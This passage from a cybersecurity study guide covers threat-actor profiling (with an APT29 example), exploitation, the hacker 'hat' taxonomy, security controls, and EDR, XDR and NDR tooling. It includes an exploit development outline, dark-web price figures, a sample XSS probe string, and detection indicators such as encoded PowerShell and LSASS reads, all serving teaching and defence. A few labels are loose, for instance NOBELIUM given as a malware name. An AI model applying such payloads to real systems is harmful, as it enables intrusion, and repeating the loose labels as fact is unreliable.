  Lateral Movement:     [Pass-the-Hash / RDP / SMB]
  C2 (Command & Control): [HTTP/S / DNS / Custom protocol]
  Exfiltration:         [Encrypted upload / Cloud storage / Email]

TOOLS:
  Malware: [Names of known malware families used]
  RATs:    [Remote Access Trojans]
  Loaders: [Droppers and stagers]

INDICATORS OF COMPROMISE (IOCs):
  IPs:      [Known C2 server IPs]
  Domains:  [Malicious domains used]
  Hashes:   [SHA256 of known malware samples]
  Mutex:    [Named mutex strings]

MITRE ATT&CK MAPPING:
  [List of specific ATT&CK technique IDs — T1566.001, T1059.001, etc.]

HISTORY / NOTABLE CAMPAIGNS:
  [List of known attacks, dates, and targets]
═══════════════════════════════════════════════════
```

### Example — Real Profile: APT29 (Cozy Bear)

```
THREAT ACTOR PROFILE: APT29 (Cozy Bear / The Dukes)

Classification:    Nation-State
Attribution:       Russian Federation (SVR — Foreign Intelligence Service)
Active Since:      2008
Sophistication:    Very High (among top 5 globally)

MOTIVATION:
  Primary:   Intelligence collection / Espionage
  Secondary: Political influence

TARGETS:
  Industries:  Government, Think Tanks, Defense, Healthcare, NGOs
  Geography:   USA, Europe, NATO members, Ukraine
  Asset Types: Diplomatic communications, policy documents, COVID-19 research

NOTABLE TECHNIQUES:
  • Spear-phishing with malicious documents (T1566.001)
  • Compromising legitimate software update mechanisms (T1195.002)
  • Custom malware: SUNBURST, WellMess, Hammertoss, NOBELIUM
  • Using legitimate cloud services for C2 (Dropbox, OneDrive, Twitter)
  • Hiding C2 traffic in image steganography

KNOWN CAMPAIGNS:
  • SolarWinds Supply Chain Attack (2020) — US Treasury, CISA, NSA, 18,000+ orgs
  • Democratic National Committee breach (2016)
  • COVID-19 vaccine research theft (2020) — AstraZeneca, Moderna
  • Microsoft email system compromise (2024)
```

---

## 5.6 Exploitation

### Definition
**Exploitation** is the act of taking advantage of a vulnerability in a system, application, or process to gain unauthorized access, execute malicious code, escalate privileges, or cause damage.

```
EXPLOITATION CHAIN:

  THREAT ACTOR
       │
       │ Has CAPABILITY (skills, tools)
       │ Has MOTIVATION (goal, intent)
       │ Has OPPORTUNITY (vulnerability exists AND is reachable)
       │
       ▼
  EXPLOITATION
       │
       ├── Technical:   Running exploit code against software flaw
       ├── Social Eng:  Manipulating people to give access
       └── Physical:    Physically accessing hardware or facilities
       │
       ▼
  COMPROMISE
       │
       ├── Unauthorized access achieved
       ├── Data stolen
       ├── System damaged
       └── Persistence established
```

### Types of Exploitation:

| Type | Description | Example |
|------|-------------|---------|
| **Remote Code Execution (RCE)** | Execute commands on target from network | EternalBlue → meterpreter shell |
| **Local Privilege Escalation** | Gain higher privileges on compromised system | PrintSpoofer → SYSTEM |
| **SQL Injection** | Manipulate database through input | Extracting passwords from database |
| **Cross-Site Scripting (XSS)** | Inject scripts into web pages | Stealing session cookies |
| **Social Engineering** | Exploit human psychology | Phishing, pretexting, vishing |
| **Physical Exploitation** | Physical access to system | Plugging in malicious USB |
| **Supply Chain** | Compromise software/hardware before delivery | SolarWinds backdoor |

### The Exploit Development Process:
```
1. DISCOVER vulnerability (code audit, fuzzing, reverse engineering)
2. ANALYZE the vulnerability (understand root cause — buffer overflow? UAF?)
3. DEVELOP proof-of-concept (minimal working exploit)
4. WEAPONIZE (reliable, stable, evades defenses)
5. DEPLOY against target
6. POST-EXPLOITATION (maintain access, pivot, exfiltrate)
```

---

## 5.7 Control

### Definition
A **control** (also called a safeguard or countermeasure) is any measure taken to reduce the likelihood or impact of a threat exploiting a vulnerability — thereby reducing risk.

```
CONTROL PURPOSE:
  ┌──────────────────────────────────────────────┐
  │ CONTROL = Risk Reducer                       │
  │                                              │
  │ Without control:  Risk = HIGH               │
  │ With control:     Risk = LOWER              │
  │                                              │
  │ Controls work by:                            │
  │  • Reducing LIKELIHOOD (harder to exploit)  │
  │  • Reducing IMPACT (less damage if exploited│
  └──────────────────────────────────────────────┘
```

---

## 5.8 Differences Between Core Terms — Master Summary

This is the most important table — understanding HOW these relate:

```
THE RELATIONSHIP CHAIN:

THREAT ACTOR
  (Who is the attacker?)
  │
  │ has capability and motivation
  ▼
THREAT
  (What could happen?)
  │
  │ looks for and uses
  ▼
VULNERABILITY
  (What is the weakness?)
  │
  │ acts upon via
  ▼
EXPLOITATION
  (How is the attack executed?)
  │
  │ targets
  ▼
ASSET
  (What is being attacked?)
  │
  │ determines level of
  ▼
RISK
  (What is the potential impact?)
  │
  │ reduced by
  ▼
CONTROL
  (How do we defend?)
```

| Term | What It Is | Analogy | Key Question |
|------|-----------|---------|-------------|
| **Asset** | Something valuable to protect | The house | What am I protecting? |
| **Threat** | Potential event that causes harm | Storm / Burglar | What could go wrong? |
| **Threat Actor** | Who or what causes the threat | The burglar | Who is the adversary? |
| **Vulnerability** | Weakness that can be exploited | Unlocked window | Where is the weakness? |
| **Exploitation** | Actually using the vulnerability | Burglar climbing in | How is the attack done? |
| **Risk** | Probability × Impact of harm | Chance + damage of burglary | How likely + bad is it? |
| **Control** | Measure to reduce risk | Lock, alarm, guard | How do we protect it? |

### Critical Distinctions:

```
THREAT vs VULNERABILITY:
  Threat     = External (the storm, the attacker — outside your control)
  Vulnerability = Internal (the unlocked window — within your control)
  
  You cannot eliminate threats.
  You CAN fix vulnerabilities.

RISK vs VULNERABILITY:
  Vulnerability = The flaw EXISTS (static)
  Risk          = The CHANCE the flaw will be exploited + impact (dynamic)
  
  A vulnerability in isolated, offline system = LOW risk
  Same vulnerability in internet-facing server = HIGH risk

THREAT vs RISK:
  Threat = Something that COULD happen
  Risk   = The PROBABILITY it will happen × the IMPACT if it does
  
  Meteor strike is a threat.
  Risk of meteor strike for most orgs = VERY LOW (unlikely + well, catastrophic)

CONTROL vs COUNTERMEASURE:
  These terms are often used interchangeably.
  Control = Broader term (policy, technical measure, process)
  Countermeasure = Specific technical response to a specific threat
```

---

# 6. Hacker Types

## 6.1 The Hat Color Taxonomy

```
HACKER CLASSIFICATION BY ETHICS:

     ████████   White Hat     ████████
     ███████    Black Hat     ███████
     ████████   Grey Hat      ████████
     ██████     Red Hat       ██████
     █████████  Blue Hat      █████████
     ████       Green Hat     ████

Legend:
  ⬜ WHITE  = Ethical, authorized, defensive
  ⬛ BLACK  = Malicious, unauthorized, criminal
  🔲 GREY   = Ethical but unauthorized (reports vulns, no permission)
  🔴 RED    = Offensive security, ethical but aggressive
  🔵 BLUE   = Microsoft/vendor specific bug bounty testers
  🟢 GREEN  = Learning stage, beginner ethical hackers
```

---

## 6.2 White Hat Hackers (Ethical Hackers)

```
Definition: Security professionals who use hacking techniques
            LEGALLY and with AUTHORIZATION to help organizations.

Characteristics:
  ✅ Always have written permission before testing
  ✅ Work within defined scope and rules of engagement
  ✅ Report ALL findings to the client
  ✅ Never access systems outside the agreed scope
  ✅ Maintain confidentiality of findings

Roles:
  • Penetration Tester (Pentester)
  • Red Team Operator
  • Security Researcher
  • Bug Bounty Hunter
  • Security Consultant

Certifications:
  • CEH (Certified Ethical Hacker)
  • OSCP (Offensive Security Certified Professional)
  • GPEN (GIAC Penetration Tester)
  • eJPT, eCPPT

Tools they use:
  Kali Linux, Metasploit, Burp Suite, Nmap, Wireshark, BloodHound
  (Same tools as black hats — ethics = authorization and intent)
```

---

## 6.3 Black Hat Hackers (Malicious Hackers / Crackers)

```
Definition: Attackers who hack systems WITHOUT authorization,
            for personal gain, malice, or destruction.

Characteristics:
  ❌ No authorization
  ❌ Motivated by financial gain, revenge, ideology, fame
  ❌ Use findings for criminal purposes (ransomware, data sale, espionage)
  ❌ Operate in underground forums, dark web
  ❌ Subject to criminal prosecution

Motivations:
  • Financial profit (ransomware, card fraud, BEC)
  • Espionage (state-sponsored)
  • Revenge (disgruntled ex-employees)
  • Ideology (hacktivism)
  • Challenge / ego (historical — rare now, mostly financially driven)

Underground Economy:
  Dark web markets sell:
  • Stolen credentials: $5–$15 per account
  • Credit cards: $20–$100 per card
  • RDP access to corporate servers: $50–$200
  • Ransomware-as-a-Service: 20–30% revenue share
  • Zero-day exploits: $10,000–$2.5 million
```

---

## 6.4 Grey Hat Hackers

```
Definition: Hackers who operate in the grey area between ethical and malicious.
            They hack WITHOUT authorization but DO NOT have malicious intent.

Typical Pattern:
  1. Find a vulnerability in a company's system (without permission)
  2. Exploit it minimally to prove it exists
  3. Contact the company and offer to fix it (sometimes for payment)
  4. If ignored, may publicly disclose or sell the vulnerability

Legal Status: ILLEGAL (unauthorized access is illegal regardless of intent)
Ethical Status: Debated (good intent, bad method)

Notable Grey Hat Examples:
  • MafiaBoy (2000) — 15-year-old DDoSed Amazon, eBay, CNN
  • Khalil Shreateh — Hacked Mark Zuckerberg's Facebook wall to prove a bug
    (Facebook refused to pay via bug bounty, so he demonstrated it directly)
```

---

## 6.5 Other Hat Categories

**Red Hat Hackers:**
```
Focus on aggressive offensive security to counter Black Hats.
Sometimes called "vigilante hackers" — they actively attack threat actors.
(Not to be confused with Red Team operators in corporate security)
```

**Blue Hat Hackers:**
```
External security consultants hired specifically to test security
before a product launch. Originally referred to Microsoft's security
testing program (Blue Hat Security Briefings).
```

**Green Hat Hackers (Script Kiddies):**
```
Beginners learning hacking — use existing tools and tutorials.
No deep technical understanding — just running Metasploit modules.
Can still cause damage despite low skill.
```

**State-Sponsored / APT Hackers:**
```
Governments fund elite hacking teams for:
  • Intelligence gathering (espionage)
  • Sabotage of critical infrastructure
  • Influence operations
  • Financial theft (North Korea)

Most sophisticated threat actors globally.
Budget: Tens to hundreds of millions per year.
```

**Hacktivists:**
```
Hack to promote political or social causes.
Examples:
  • Anonymous — "We are Anonymous. We are Legion."
  • Defacing government websites to protest policies
  • Leaking confidential government documents
```

---

# 7. Countermeasures & Controls — Full Taxonomy

## 7.1 Control Types by Function

Controls are classified by WHAT THEY DO (their function):

```
CONTROL FUNCTIONS:

┌──────────────────────────────────────────────────────────────────┐
│                        ATTACK TIMELINE                           │
│  Before Attack          During Attack         After Attack       │
│                                                                  │
│  ┌───────────┐       ┌───────────┐        ┌───────────┐         │
│  │ DETERRENT │       │ DETECTIVE │        │CORRECTIVE │         │
│  │           │       │           │        │           │         │
│  │ Discourages       │ Detects   │        │ Recovers  │         │
│  │ attacks   │       │ attacks   │        │ from      │         │
│  │ from      │       │ in        │        │ attacks   │         │
│  │ starting  │       │ progress  │        │           │         │
│  └───────────┘       └───────────┘        └───────────┘         │
│                                                                  │
│  ┌───────────┐                                                   │
│  │PREVENTIVE │                                                   │
│  │           │                                                   │
│  │ Stops the │                                                   │
│  │ attack    │                                                   │
│  │ from      │                                                   │
│  │ succeeding│                                                   │
│  └───────────┘                                                   │
└──────────────────────────────────────────────────────────────────┘
```

### 7.1.1 Deterrent Controls
**Goal:** Discourage attackers from attempting an attack in the first place.  
**Logic:** Make the attack seem too risky, too difficult, or not worth the effort.

```
Examples by Category:

PHYSICAL DETERRENTS:
  • Warning signs ("Premises Protected by CCTV")
  • Security lighting (makes cover of darkness useless)
  • Visible guards and patrol vehicles
  • Barbed wire fences, bollards, barriers
  • Posted trespassing warnings

TECHNICAL DETERRENTS:
  • Login banners ("Unauthorized access is monitored and illegal")
  • Honeypots (decoy systems that attract and track attackers)
  • Visible security cameras on network equipment
  • Published security policies on the company website

ADMINISTRATIVE DETERRENTS:
  • Published legal consequences for violations
  • Acceptable Use Policies with termination consequences
  • Background checks (deters bad actors from applying)
  • Mandatory security awareness training with acknowledgment

OPERATIONAL DETERRENTS:
  • Regular security audits (signals active monitoring)
  • Visible incident response team presence
  • Bug bounty programs (channel hackers into legal reporting)
```

### 7.1.2 Preventive Controls
**Goal:** Stop the attack from SUCCEEDING even if attempted.  
**Logic:** Create barriers that block exploitation.

```
PHYSICAL PREVENTIVE:
  • Locks, deadbolts, safes
  • Biometric access control (fingerprint, retina)
  • Mantraps / airlocks (prevents tailgating)
  • Cable locks on laptops
  • Server rack locks

TECHNICAL PREVENTIVE:
  • Firewalls (block unauthorized network traffic)
  • MFA (prevent login even with stolen password)
  • Encryption (data unusable even if stolen)
  • Patch management (fix vulnerabilities before exploited)
  • Anti-malware / EDR (block malicious code execution)
  • WAF — Web Application Firewall (block web attacks)
  • Input validation (prevent SQL injection, XSS)
  • Network segmentation (limit lateral movement)
  • Least privilege (limit damage if account compromised)

ADMINISTRATIVE PREVENTIVE:
  • Security policies (define required behaviors)
  • Separation of duties (no single person can do harmful actions alone)
  • Mandatory vacation (detect fraud by rotating roles)
  • Job rotation (prevent too much knowledge concentration)
  • Security awareness training (prevent phishing clicks)
  • Vendor risk assessments (prevent supply chain compromise)

OPERATIONAL PREVENTIVE:
  • Change management process (authorized changes only)
  • Access provisioning/deprovisioning process (timely access removal)
  • Secure software development lifecycle (SSDLC)
  • Vulnerability management program (patch before exploitation)
  • Penetration testing (find weaknesses before attackers do)
```

### 7.1.3 Detective Controls
**Goal:** Identify that an attack has occurred or is in progress.  
**Logic:** You cannot prevent everything; you must be able to detect what happens.

```
PHYSICAL DETECTIVE:
  • CCTV cameras (record activity)
  • Motion sensors and alarms
  • Physical audit logs (sign-in books, badge reader logs)
  • Tamper-evident seals on hardware
  • Inventory checks (detect missing equipment)

TECHNICAL DETECTIVE:
  • IDS/IPS (Intrusion Detection/Prevention System)
  • SIEM (Security Information and Event Management)
  • Log monitoring and analysis
  • Network traffic analysis (NetFlow, full packet capture)
  • EDR (Endpoint Detection and Response) — behavioral monitoring
  • File Integrity Monitoring (FIM) — detects changed files
  • Honeypots / Honeytokens (detect attackers accessing decoys)
  • Anomaly detection (unusual login times, data volumes, locations)
  • DLP (Data Loss Prevention) — detects unauthorized data movement

ADMINISTRATIVE DETECTIVE:
  • Security audits and assessments
  • Log reviews and access reviews
  • User activity reporting
  • Compliance audits (SOC 2, ISO 27001 audits)

OPERATIONAL DETECTIVE:
  • Security Operations Center (SOC) 24/7 monitoring
  • Threat hunting (proactive search for threats)
  • Incident response exercises (tabletop exercises)
  • Penetration tests (detect weaknesses)
```

### 7.1.4 Corrective Controls
**Goal:** Restore systems and operations after an attack.  
**Logic:** Minimize the damage and recover as quickly as possible.

```
PHYSICAL CORRECTIVE:
  • Fire suppression systems
  • Emergency power systems (UPS, generators)
  • Spare equipment (hot/cold/warm spares)
  • Secure destruction of compromised hardware

TECHNICAL CORRECTIVE:
  • Backup and recovery systems (restore from clean backup)
  • Incident response tools (forensics, memory dumping)
  • Patch deployment (fix exploited vulnerability)
  • System reimaging (wipe and reinstall from known good)
  • Vulnerability remediation tools
  • Antimalware removal tools
  • Rollback capabilities (snapshots, version control)

ADMINISTRATIVE CORRECTIVE:
  • Incident response plan (IRP) — documented recovery steps
  • Business continuity plan (BCP)
  • Disaster recovery plan (DRP)
  • Lessons learned / post-incident review
  • Insurance (cyber insurance policies)

OPERATIONAL CORRECTIVE:
  • Incident response team (CIRT/CSIRT)
  • Forensic investigation
  • Communication plans (PR, legal, regulatory notification)
  • Root cause analysis
```

---

## 7.2 Control Types by Category

Controls are ALSO classified by WHAT THEY ARE (their nature):

### 7.2.1 Technical Controls

Technical controls are technology-based safeguards implemented in hardware, software, or firmware.

**Firewalls:**
```
WHAT IT IS:
A network security device that monitors and controls incoming and
outgoing network traffic based on predetermined security rules.

TYPES:
  Packet Filtering Firewall:
    • Operates at Layer 3/4 (IP/TCP)
    • Checks: source IP, destination IP, port, protocol
    • Fast but limited — no application context
    • Example: ACL on a router
    
  Stateful Inspection Firewall:
    • Tracks the STATE of network connections
    • Knows if a packet is part of an established connection
    • More intelligent — blocks unsolicited responses
    • Example: pfSense, Cisco ASA
    
  Application Layer Firewall (Proxy Firewall):
    • Operates at Layer 7 (Application)
    • Understands HTTP, DNS, FTP etc.
    • Can detect attacks within permitted traffic
    • Example: Squid proxy, Palo Alto NGFW
    
  Next-Generation Firewall (NGFW):
    • Combines stateful + application awareness + IPS + SSL inspection
    • Can identify applications regardless of port
    • Deep Packet Inspection (DPI)
    • User identity awareness (who is doing what, not just which IP)
    • Examples: Palo Alto, Fortinet FortiGate, Check Point

PLACEMENT:
  ┌─────────────┐    Firewall    ┌──────────────┐    Firewall    ┌─────────┐
  │  Internet   │ ─────────────► │     DMZ      │ ─────────────► │Internal │
  │ (Untrusted) │               │ (Web servers)│               │ Network │
  └─────────────┘               └──────────────┘               └─────────┘

RULES LOGIC:
  Default-deny: Block everything, allow only explicitly permitted traffic.
  (Always better than default-allow)
```

**IDS/IPS:**
```
IDS = Intrusion DETECTION System — detects and ALERTS (passive)
IPS = Intrusion PREVENTION System — detects and BLOCKS (active)

DETECTION METHODS:
  Signature-Based:
    • Database of known attack patterns
    • Fast and accurate for known threats
    • Fails against unknown (zero-day) attacks
    • Like antivirus — needs regular signature updates
    
  Anomaly-Based (Behavioral):
    • Learns what "normal" looks like (baseline)
    • Alerts on deviations from baseline
    • Detects zero-day attacks
    • Higher false positive rate
    • Example: "This server normally sends 1GB/day — today it sent 100GB → ALERT"
    
  Heuristic:
    • Rule-based intelligence (if-then logic)
    • "If a scan touches 1000 ports in 5 seconds, it's a port scan"

PLACEMENT:
  NIDS (Network IDS): Monitors network traffic (tap or span port)
  HIDS (Host IDS):    Monitors a single host's activity and logs
  
  ┌─────────────────────────────────────────────────────┐
  │                                                     │
  │  Internet → Router → FIREWALL → SWITCH → Servers   │
  │                          │                  │       │
  │                         NIDS              HIDS      │
  │                       (network)          (host)    │
  └─────────────────────────────────────────────────────┘
```

**WAF (Web Application Firewall):**
```
WHAT IT IS:
A specialized firewall that protects web applications by filtering and
monitoring HTTP/HTTPS traffic. Sits between the internet and the web app.

PROTECTS AGAINST:
  • SQL Injection (SQLi)
  • Cross-Site Scripting (XSS)
  • Cross-Site Request Forgery (CSRF)
  • File Inclusion attacks (LFI/RFI)
  • Remote Code Execution via web
  • OWASP Top 10 vulnerabilities
  
OPERATION MODES:
  Detection Mode: Logs and alerts but does NOT block (safe for tuning)
  Prevention Mode: Actively blocks malicious requests
  
TYPES:
  Network WAF:  Hardware appliance in the data center
  Host WAF:     Software installed on the web server (ModSecurity)
  Cloud WAF:    Managed service (Cloudflare WAF, AWS WAF, Akamai)
  
HOW IT WORKS:
  User Request: GET /search?q=<script>alert(1)</script>
                       │
                       ▼
                   WAF inspects:
                   "Does this contain XSS patterns?" → YES
                       │
                       ▼
                   WAF BLOCKS request (403 Forbidden)
                   
WITHOUT WAF:
  Same request reaches the web app → XSS executes → session stolen
```

**Antimalware / Endpoint Protection:**
```
GENERATIONS OF ENDPOINT PROTECTION:

Generation 1 (1980s-2000s): Traditional Antivirus (AV)
  • Signature database: "If this exact byte sequence exists, it's malware"
  • Fast, effective against known malware
  • Completely blind to new/unknown malware
  • Can be bypassed by minor obfuscation changes

Generation 2 (2000s-2010s): Next-Gen AV (NGAV)
  • Heuristic analysis (behavior patterns, not just signatures)
  • Machine learning classification
  • Sandbox execution (detonate malware in isolated VM)
  • More effective but more false positives

Generation 3 (2010s-Present): EDR (Endpoint Detection & Response)
  • Continuous monitoring of ALL endpoint activity
  • Behavioral analytics (what is the process DOING, not just what it IS)
  • Timeline reconstruction (how did the attacker get in?)
  • Remote remediation (kill process, isolate host, roll back changes)
  • Threat hunting capability
```

---

### 7.2.2 Operational Controls

Operational controls are process-based safeguards — how people do their work.

```
PROCEDURES:
  Step-by-step instructions for performing security tasks.
  Examples:
    • "How to onboard a new employee account securely"
    • "How to respond to a phishing report"
    • "How to patch production servers"
    • "How to conduct a security review before code deployment"
    
PROCESSES:
  Higher-level workflows that coordinate multiple procedures.
  Examples:
    • Vulnerability Management Process (discover → assess → remediate → verify)
    • Incident Response Process (prepare → detect → contain → eradicate → recover → lessons learned)
    • Access Review Process (quarterly review of all user permissions)
    • Change Management Process (request → test → approve → implement → review)
```

---

### 7.2.3 Physical Controls

Physical controls protect the physical environment where systems and data reside.

```
CCTV (Closed-Circuit Television):
  • Video surveillance of physical spaces
  • Deterrent (visible cameras discourage intrusion)
  • Detective (record for forensic review after incident)
  • Modern systems: IP cameras, AI-based motion analysis, facial recognition
  • Best practice: redundant storage, tamper-proof housings, coverage of all entries

GATES AND TRAP DOORS / MANTRAPS:
  Mantrap:
    • Double-door entry system — only one door opens at a time
    • Person enters first door, it closes, identity verified, second door opens
    • Prevents tailgating (following authorized person through door)
    • Common in data centers, government facilities
    
  Security Gates:
    • Vehicle barriers (retractable bollards, crash-rated barriers)
    • Prevents vehicle-ramming attacks
    • Controls vehicle access to sensitive facilities
    
GUARDS:
  • Human security — adapts to situations technology cannot handle
  • Roles: access verification, patrol, incident response, escort visitors
  • Limitation: fatigue, corruption, social engineering susceptibility
  • Complement with technology (CCTV + guards = better than either alone)

LIGHTS:
  • Security lighting eliminates hiding places
  • Deters criminal activity (most criminals avoid well-lit areas)
  • Motion-activated lights are cost-effective for perimeters
  • Adequate lighting for CCTV effectiveness
  • Emergency lighting for evacuation paths
```

---

### 7.2.4 Administrative Controls

Administrative controls are management-based safeguards — policies, rules, and oversight.

```
POLICIES:
  High-level documents that state WHAT must be done.
  Examples:
    • Acceptable Use Policy (AUP): "Company computers must only be used for work"
    • Password Policy: "Passwords must be 12+ chars, complex, changed every 90 days"
    • Data Classification Policy: "PII must be encrypted at rest and in transit"
    • Remote Access Policy: "VPN with MFA required for remote work"
    • Incident Response Policy: "All security incidents must be reported within 1 hour"

SEPARATION OF DUTIES:
  No single person has enough access to perform harmful actions alone.
  
  Example: Financial Fraud Prevention:
    Person A: Can CREATE a vendor in the system
    Person B: Can APPROVE payment to a vendor
    Person C: Can RELEASE funds
    → No single person can create AND approve AND release payment
  
  IT Example:
    Developer: Can write code
    Security Reviewer: Must approve code before deployment
    Operations: Can deploy to production
    → Developer cannot also deploy their own (potentially malicious) code

DATA CLASSIFICATION:
  Labels data by sensitivity to ensure appropriate handling.
  
  Government Classification:
    Top Secret → SECRET → Confidential → Unclassified
  
  Corporate Classification:
    Restricted → Confidential → Internal → Public
    
  Each level has rules for:
    • Who can access it
    • How it must be stored (encryption requirements)
    • How it can be transmitted (approved channels only)
    • How it must be disposed of (shredding, secure deletion)

AUDITING:
  Regular review and verification that controls are working.
  
  Types:
    • Internal Audit: Conducted by organization's own audit team
    • External Audit: Conducted by independent third party (more credible)
    • Compliance Audit: Checks against specific standard (PCI-DSS, HIPAA, ISO)
    • Security Audit: Technical assessment of security posture
    • Log Audit: Review of system and access logs for anomalies
    
  Output: Audit report with findings, recommendations, remediation deadlines
```

---

# 8. Security Technology Deep Dives

## 8.1 EDR — Endpoint Detection and Response

### What is EDR?

EDR is a cybersecurity solution that continuously monitors endpoints (laptops, servers, workstations) for malicious activity, records endpoint and network events, and provides the capability to detect, investigate, and respond to threats.

```
EDR ARCHITECTURE:

  ┌─────────────────────────────────────────────────────────────┐
  │                     EDR PLATFORM                            │
  │                                                             │
  │  ┌─────────────────┐         ┌──────────────────────────┐  │
  │  │   Data Lake /   │         │   Detection Engine       │  │
  │  │   Telemetry     │         │                          │  │
  │  │   Database      │◄───────►│  • YARA Rules            │  │
  │  │                 │         │  • Behavioral Analytics  │  │
  │  │  All endpoint   │         │  • ML Models             │  │
  │  │  activity stored│         │  • Threat Intel Feed     │  │
  │  │  (weeks/months) │         │  • IOC Matching          │  │
  │  └─────────────────┘         └──────────────────────────┘  │
  │           ▲                              │                  │
  │           │ Telemetry                    │ Alerts           │
  │           │                             ▼                  │
  │    ┌──────┴───────┐         ┌──────────────────────────┐   │
  │    │  EDR Agent   │         │  Analyst Console         │   │
  │    │  (on endpoint│         │                          │   │
  │    │  - hooks OS  │         │  • Alert triage          │   │
  │    │  - monitors  │         │  • Threat hunting        │   │
  │    │    processes │◄────────│  • Remote remediation    │   │
  │    │  - sends data│  Response│  • Timeline view        │   │
  │    └──────────────┘         │  • Investigation tools   │   │
  │                             └──────────────────────────┘   │
  └─────────────────────────────────────────────────────────────┘
```

### What EDR Monitors:

```
ENDPOINT TELEMETRY COLLECTED:
  Process Events:
    • Process creation (parent/child relationships)
    • Process termination
    • DLL loading (which libraries are loaded by which processes)
    • Memory allocations (RWX regions = suspicious)
    
  File System Events:
    • File creation, modification, deletion, rename
    • Executable file writes (malware dropping payloads)
    • Suspicious file paths (C:\Temp\*.exe, C:\Users\Public\*.exe)
    
  Registry Events:
    • Registry key reads and writes
    • Persistence mechanism additions (Run keys, services)
    
  Network Events:
    • DNS queries (malicious domains, DGA detection)
    • TCP/UDP connections (C2 communications)
    • HTTP/HTTPS requests (URLs visited by processes)
    
  Authentication Events:
    • Login/logout events
    • Privilege escalation
    • Credential access (LSASS memory reads)
    
  Command Execution:
    • PowerShell commands
    • CMD commands
    • Script execution (VBScript, JScript, Python)
    • WMI operations
```

### EDR Response Capabilities:
```
  • Isolate host (cut network access — quarantine while preserving evidence)
  • Kill process (terminate malicious process remotely)
  • Delete file (remove dropped payloads)
  • Block network connection (add firewall rule)
  • Collect artifacts (dump memory, collect logs for forensics)
  • Rollback changes (undo registry/file changes made by malware)
  • Run custom scripts (deploy custom investigation or remediation)
```

### Major EDR Products:

| Product | Vendor | Notes |
|---------|--------|-------|
| **CrowdStrike Falcon** | CrowdStrike | Market leader, cloud-native |
| **Microsoft Defender for Endpoint** | Microsoft | Built into Windows, integrates with M365 |
| **SentinelOne** | SentinelOne | AI-driven, autonomous response |
| **Carbon Black (VMware)** | Broadcom/VMware | Strong on Linux support |
| **Cortex XDR** | Palo Alto Networks | Integrated with network security |
| **Cybereason** | Cybereason | Operation-centric detection |
| **Elastic Security** | Elastic | Open-source based, flexible |

---

## 8.2 XDR — Extended Detection and Response

### What is XDR?

XDR extends EDR beyond endpoints to correlate telemetry from **multiple security layers** — endpoints, network, cloud, email, identity, and applications — to provide a unified threat detection and response platform.

```
EDR vs XDR:

EDR:
  ┌────────────┐
  │  Endpoint  │ ← Only sees endpoint events
  └────────────┘

XDR:
  ┌────────────┐
  │  Endpoint  │─────────────────────────────────────┐
  └────────────┘                                     │
  ┌────────────┐                                     ▼
  │  Network   │─────────────────────────────► ┌─────────┐
  └────────────┘                               │   XDR   │
  ┌────────────┐                               │ Platform│
  │   Email    │─────────────────────────────► │         │
  └────────────┘                               │Correlates│
  ┌────────────┐                               │all data │
  │   Cloud    │─────────────────────────────► │         │
  └────────────┘                               └─────────┘
  ┌────────────┐                                     │
  │  Identity  │─────────────────────────────────────┘
  └────────────┘

RESULT: XDR sees the COMPLETE attack chain across all layers,
        not just isolated events from a single layer.
```

### XDR Attack Correlation Example:

```
WITHOUT XDR (Siloed Detection):
  Email Security: "Phishing email blocked" → INFO LOG
  EDR: "PowerShell ran encoded command" → MEDIUM ALERT
  Network: "Unusual outbound traffic to IP" → LOW ALERT
  
  Analyst sees THREE SEPARATE LOW/MEDIUM ALERTS.
  No one correlates them → attacker succeeds.

WITH XDR (Correlated Detection):
  XDR correlates:
    1. Phishing email → clicked by User X at 9:05am
    2. 30 seconds later, User X's machine ran encoded PowerShell
    3. 5 minutes later, outbound connection to C2 server established
    
  XDR generates ONE HIGH PRIORITY INCIDENT with full timeline:
  "User X compromised via phishing → malware installed → C2 connected"
  
  Analyst sees complete attack story → responds immediately.
```

### Native XDR vs Open XDR:

```
NATIVE XDR:
  All components from ONE vendor's ecosystem.
  Advantages: Deep integration, simpler deployment
  Disadvantages: Vendor lock-in, may not cover all environments
  Examples: Palo Alto Cortex XDR, Microsoft Defender XDR (M365 Defender)

OPEN/HYBRID XDR:
  Integrates components from MULTIPLE vendors.
  Advantages: Best-of-breed components, flexibility
  Disadvantages: Integration complexity, potential gaps
  Examples: Exabeam, Secureworks Taegis
```

---

## 8.3 NDR — Network Detection and Response

### What is NDR?

NDR monitors **network traffic** to detect threats that have bypassed endpoint and perimeter controls. It analyzes east-west (lateral movement) and north-south (external) traffic using behavioral analytics and machine learning.

```
NDR DEPLOYMENT:

  Internet
     │
     ▼
  Firewall/Router
     │
     ├──────────────────────────────────────────┐
     │                                          │
     ▼                                          │
  Core Switch ──────────────────────────────────┤
     │        (SPAN Port / TAP)                 │
     │                                          ▼
     ├── Server Farm                       ┌──────────┐
     ├── User Workstations                 │   NDR    │
     ├── IoT Network                       │ Sensor   │
     └── DMZ                              │          │
                                           │Passive   │
                                           │copy of   │
                                           │all traffic│
                                           └────┬─────┘
                                                │
                                                ▼
                                         ┌──────────────┐
                                         │ NDR Platform │
                                         │ (Analysis)   │
                                         │              │
                                         │ ML Analytics │
                                         │ Threat Intel │
                                         │ Protocol     │
                                         │  Analysis    │
                                         └──────────────┘
```

### What NDR Detects:

```
THREAT SCENARIOS NDR CATCHES:

Lateral Movement:
  • Unusual internal SMB traffic (ransomware spreading)
  • Port scanning within internal network
  • Pass-the-Hash authentication patterns
  • Unusual RDP connections between workstations

C2 (Command & Control) Traffic:
  • Beaconing patterns (regular outbound connections at fixed intervals)
  • DNS tunneling (data hidden in DNS queries)
  • Encrypted traffic to known malicious IPs
  • Unusual protocols or ports (HTTP on port 8080, 4444, etc.)

Data Exfiltration:
  • Large outbound data transfers (unusual volume)
  • Transfers to cloud storage (Dropbox, Google Drive) from servers
  • Connections to foreign IP ranges

Protocol Anomalies:
  • Malformed packets
  • Protocol misuse (FTP over port 80, etc.)
  • Cleartext credentials in protocols (Telnet, FTP, HTTP Basic Auth)
```

### Key NDR Technologies:

```
FULL PACKET CAPTURE (FPC):
  • Captures every single packet
  • Most storage-intensive but most comprehensive
  • Used for forensic investigation

NET FLOW ANALYSIS:
  • Records metadata about connections (who talked to who, when, how much)
  • Does NOT store packet contents
  • Much lower storage, can monitor for months/years

JA3/JA3S FINGERPRINTING:
  • Fingerprints TLS connections without decrypting them
  • Identifies malware C2 even in encrypted traffic
  • Malware families have unique TLS fingerprints

ML BEHAVIORAL ANALYTICS:
  • Baseline: "This server normally communicates with 20 destinations"
  • Anomaly: "This server just contacted 500 new destinations in 1 hour"
